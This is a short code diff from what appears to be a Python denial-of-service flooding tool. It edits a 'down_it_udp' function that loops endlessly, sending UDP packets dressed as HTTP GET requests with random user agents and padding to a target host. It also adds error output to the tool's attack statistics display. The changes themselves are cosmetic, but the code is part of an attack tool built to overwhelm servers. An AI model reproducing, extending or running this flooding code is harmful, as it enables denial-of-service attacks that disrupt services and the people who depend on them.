@@ -115,7 +115,11 @@ def down_it_udp(_ctx: Context):
     i = 1
     while True:
         extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
-        packet = f'GET / HTTP/1.1\nHost: {_ctx.host}\n\n User-Agent: {random.choice(_ctx.user_agents)}\n{_ctx.base_headers[0]}\n\n{extra_data}'.encode('utf-8')
+        packet = f'GET / HTTP/1.1' \
+                 f'\nHost: {_ctx.host}' \
+                 f'\n\n User-Agent: {random.choice(_ctx.user_agents)}' \
+                 f'\n{_ctx.base_headers[0]}' \
+                 f'\n\n{extra_data}'.encode('utf-8')
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
         try:
@@ -314,6 +318,12 @@ def show_statistics(_ctx: Context):
     print(f'Connection Success:         {connections_success}')
     print(f'Connection Failed:          {connections_failed}')
     print('------------------------------------------------------')
+
+    if _ctx.errors:
+        print('\n\n')
+    for error in _ctx.errors:
+        print(f"\033[91m{error}\033[0;0m\n")
+        print('\007')
 
     sys.stdout.flush()
     time.sleep(3)
